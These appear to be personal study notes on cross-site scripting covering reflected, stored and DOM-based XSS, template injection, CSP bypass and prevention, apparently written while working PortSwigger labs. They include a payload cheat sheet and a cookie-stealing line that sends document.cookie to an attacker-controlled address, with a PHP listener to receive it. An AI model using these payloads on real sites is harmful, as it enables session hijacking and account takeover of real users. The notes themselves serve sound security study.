
### General Notes

> Allows an attacker to control the content of a web application.
> Can target the application users.

> When a web application uses unfiltered user input to build content.
> Attackers can control the output HTML and JavaScript.

> Can steal other user [[Cookies]], or impersonate other user [[Sessions]].

> XSS involves injecting malicious code in the output of the page that is then rendered by users of that page.
> XSS circumvents the [[Same Origin Policy (SOP)]].

---

### Finding XSS

> Look at every user input, and test if it's displayed as output.
* [[HTTP]] headers, `POST`/`GET` variables, and [[Cookies]] variables.

> Try injecting HTML tag to see if the HTML is interpreted: `<i>, <h1>`.
> Try injecting JavaScript: `<script>alert('XSS')</script>`.

> To exploit the XSS, there are different types of attacks:
1. Reflected.
2. Persistent.
3. DOM Based.
4. Dangling Markup.

##### Scanners

* [XSStrike](https://github.com/s0md3v/XSStrike).
```bash
xsstrike -u http://<url>/param=mins
```
> must include the `param` to be tested against XSS.

---
### Reflected XSS Attacks

> When the payload is carried inside the request that the user (victim) browser sends to the vulnerable website.
* Example: A link to a website with an embedded payload. `http://victim.site/search.php?find=<payload>`.
> Use the simple payload as proof of concept.
```
<script>alert("XSS")</script>
```

> Called reflected because an input field of the [[HTTP]] request sent gets reflected as output in the immediate response of the browser.
> There are reflected XSS filters built now to counter such attack.

> To make a victim issue a request that an attacker controls, they can place links on a website the attacker controls, or through phishing.
> If an attacker can control a script that is executed in the victim browser, then the attacker can fully compromise that user: 
* Perform an action that the user can perform.
* View any information the user can view.
* Modify and information the user can view.
* Initiate interactions with other users.

> How to search for reflected XSS:
* Test every entry point: URL query parameters, data in the URL query string or message body, URL file path and [[HTTP]] headers.
* Submit random alphanumeric values.
* Determine the reflection context: determine if the output is in HTML tags, in a tag attribute or in a JavaScript string.
* Test a payload: leave the initial value and place the payload before or after it.
* Test the attack in the browser.

---

### Persistent (Stored) XSS Attacks

> When the malicious payload is sent to the webserver and **stored** there.
> When an application receives data from an untrusted source and includes that data within its later HTTP responses.
> When a webpage then loads, it pulls this payload from the server and the malicious code is displayed within the HTML output.

>Common in HTML forms where users submit content to the webserver and then is displayed back to users.
* Common sections
* User profiles
* Forum posts

> These attacks are self-contained within the application, and the user doesn't have to be prompted to click on something for it work like reflected attacks.
> The user is garaunteed to be logged in for these attacks to work, hence, easily compromising accounts.

> How to search for stored XSS:
*  Look for a link between entry and exit points, or the points where the payload is inserted, and where it shows in later responses.

---
### DOM-Based XSS

> [[DOM Based Vulnerabilities]].

> When javascript takes data from the attacker in a source and passes it to a sink that supports dynamic code execution, such as `eval()` or `innerHTML`.
> A sourrce such as the URL, which is passed with the `window.location` object, is the most common for DOM based XSS.

> The Sink is the portion of code where the payload is entered and executes the attack.
> There is a DOM vulnerability if there is an executable path through which data moves from source to sink. Also known as *taint flow*.

##### HTML Sinks
> Testing for DOM-based means including alphanumeric strings and checking where it appears in the HTML of the webpage.
> Identify the HTML context, and try constructing a payload that breaks out.
> Adding an extra `"` to break out of the existing tag maybe, or `>` to break out.

#### JavaScript Execution Sinks
> Use the JavaScript debugger to test how the input was sent and interpreted by the sink.
> Identify the JavaScript context, and look at the different variables and areas that the data moves to.
> Try to form a payload that exits or adds another element or tag.

```
"> < svg onload = alert(1) >
```

> Sometimes, we can introduce errors, and then call the onerror attribute with the payload.
```
<img src=1 onerror=alert(1)>
```

##### DOM XSS in jQuery

> The `attr()` function can change the attributes of DOM elements.
> If data read from a user controlled source and passed to the `attr()` function, we can insert a payload an create a XSS attack.
> Identify jQuery via the `$` sign.

> To execute JavaScript inside attributes, such as `href`, add `javascript: <code>` inside the `href` attribute.

> `location.hash` was used for scrolling animations done using the `hashchange` event handler. ([[Events Module]])
> The `hash` is user controllable, the area that is scrolled to. Payload can be inserted there.
> The payload must trigger `hashchange` without user interaction.
```
<iframe src = "https://website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'"
```

##### DOM XSS in [[Angular]]

> If a webpage uses the `ng-app` attribute, JavaScript inside double curly braces `{{ <code> }}` will be executed anywhere inside the HTML.
> Use the `constructor` function to return references to creating functions. These functions can be executed by adding `()` afterwards. [Function Constructor](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function).
> Used by going to a function in scope, and then calling the constructor with the `alert` function.
```
{{ $new.constructor('alert()') () }}
```
> The `$` is used in JavaScript frameworks and libraries.

> Checking the functions in the scope using the `id` of an element in that scope.
```
anular.element(document.getElementById('<ID>')).scope()
```

##### Reflected DOM XSS

> Sometimes websites reflect in their URL parameters data from the response.
> The server produces data from a request, and echoes it in a response.
> This data could be placed into an item within the DOM, such as in forms.
> A script can then read this data, and places it into a sink that causes the exploit.

##### Stored DOM XSS

> Websites can store data on the server and is then included in a later response.
> A JavaScript script within this repsonse can contain a sink that can cause the exploit.

---

### XSS Payloads

> If the spaces cause errors, remove them.
> Sometimes double qoutes dont work, replace them with single qoutes.
> To break out of a string, use the `\"` to insert a qoute. If that doesn't work, try `</script>` and then insert the payload.
```
mins"> <svg onload=alert(1)>     //closing off a tag and adding a new one.

" onfocus=alert() autofocus x="  //closing off an attribute and adding a new one and 
closing off the rest.

"> <body onload="alert()         // closing off an attribute and adding a new element to close of the remaining qoute and angle bracket.

minso> </select> <svg onload=alert()>

<img src=1 onerror=alert(1)>

href = javascript:alert(document.cookie)

{{ $new.constructor('alert()') () }}  //angular

</script><img src=1 onerror=alert(document.domain)>  //breaking out of the script and adding our own code.

</script><script>alert()</script>     //same as above but adding a new script tag.

<iframe src ="https://0a0b00b9043b4ccf8331690900400055.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print()>'"></iframe>

onerror=alert; throw,1       // when brackets are encoded and cannot be used.

//if no tags are allowed use the script technique with the location attribute
<script> location = "https://0abc00ce0377f43f8328cd54009500e5.web-security-academy.net/search= <mins id=omar onfocus=alert(document.cookie)> #omar"; </script>
```
> This last one creates a custom tag `mins`, and adds the attribute `onfocus` and then focuses on it using the `#omar` at the end using its id, triggering the event. Can use the `autofocus` attribute as well.


##### Breaking out of a JavaScript string
```
'-alert(document.domain)-' 
';alert(document.domain)//
```
> If they don't work, try adding `\` in the beginning to escape out of the string the single qoute.


##### Using HTML- [[Web Encoding]]

> Using HTML encoding to bypass sanitization checks.
> The browser can decode the encoded attack while interpreting the JavaScript, so the attack succeeds.
```
&apos;-alert(document.domain)-&apos;
```
> The apostrophe gets sanitized, so inputting encoded passes these checks, and then the browser decodes it while interpreting the javascript.
> Find the list of codes [here](https://html.spec.whatwg.org/multipage/named-characters.html#named-character-references).
> Can also use the hex version encoding, or numbers.

##### `<svg>`

> The `svg` tag allows for other tags inside it, which can be used to craft more complex exploits where some tags are blocked.
``` HTML
<svg> <animatetransform onbegin=alert(1)> </svg>

<svg> <a>
<animate attributeName='href' values='javascript:alert(1)'></animate>
<text x='10' y='10'> Click </text>
</a> </svg>
```

##### JavaScript String Literals

> Similar to Angular [[String Interpolation]], where there is javascript executed inside html between the ` `` ` backticks.
> If the XSS input is there, we can put the payload between `${ <code> }` .
```
${alert(1)}
```

##### Canonical Tags in XSS

> Some events aren't fired automatically.
> They use the `accesskey` attribute that defines a letter.
> If this letter is pressed with a combination of other keys, the assigned event is triggered.

##### Finding the Right Tag and Event Attribute Using [[Burp Suite]]

> Head to the [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).
1. Open the Burp Suite Intruder tab and inject the placeholders inside `<>` tags to test first the tag itself.
2. Set the payloads to be the copied tags from the cheat sheet.
3. After finding the correct element, find the right attribute by placing the placeholders `<element-found XX=1>`. 
4. Set the payloads to be the copied attributes from the cheat sheet.

---

### Client Side Template Injection

> These vulnerabilities arise when client side frameworks dynamically embed user input into the webpages.
> These frameworks scan the template and executes any expressions that it can.
> These can be exploited via XSS.

> Using `.charAt=[].join` causes the function to return all characters sent to it.
> If there are no strings allowed, by preventing qoutes and double qoutes, we can use `String.fromCharCode()`.
> We don't have access to `String`, so we need to use `fromCharCode()` from an actual string variable, or creating a string.
> Use `$eval()` to create strings, or the `[1]|orderBy:'String'` function.
> This String in the end can be created using `fromCharCode()`.

>An example payload would be.
```
toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```
>The first line creates an empty string `''` and escapes from the Angular sandbox.
>The second line uses that string to create a string given its ASCII codes in order.
>Those ASCII codes translate to `x=alert(1)`.

---

### [[Cookies]] Stealing With XSS, Session Hijacking

We are stealing a user's cookies and then using them to steal their logged in session.

> JavaScript can only access [[Cookies]] if the `HttpOnly` flag is disabled. 
> Cookies can be displayed with `<script>alert(document.cookie)</script>`.

> This is a stored attack, meaning it will be put in a place where users visit, so their cookies are stolen and sent to that website URL.
> The subdomain of the cookie should be the same as the subdomain of the website in which the cookie is.

> To send cookies to us:
```JavaScript
document.location='our-ip/'+document.cookie
```

This payload should be injected in the vulnerable XSS injection point. To start a listener:
```bash
sudo php -S 0.0.0.0:80
```

---

### Content Security Policy (CSP)

> Browser mechanism to mitigate XSS via the [[HTTP]] response header `Content-Security-Policy`.
> The values of that header are directives separated by semicolons.
> NOT IN FIREFOX.

* `script-src 'self'` : allows only scripts loaded from the same origin page. [[Same Origin Policy (SOP)]].
* `script-src https://scripts.normal-website.com` : Allows scripts from a specific domain.

> If these headers are input controlled, they can be attacked.
> Found in a `report-uri` directive, the last one in the list.
> A semicolon can be added, and our own policies can be added.

> Chrome introduced the `script-src-elem` directive that can be used to control `script` elements.
> This can be used to overwrite existing `script-src` elements.
> Open the console while playing with this to see the results.

``` HTML
<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```
> Added the `unsafe-inline` directive value that takes any script.

---

### Preventing XSS Attacks

1. Filter input on arrival
2. Encode data on output
3. Use appropriate response headers
4. Content Security Policy (CSP)

---
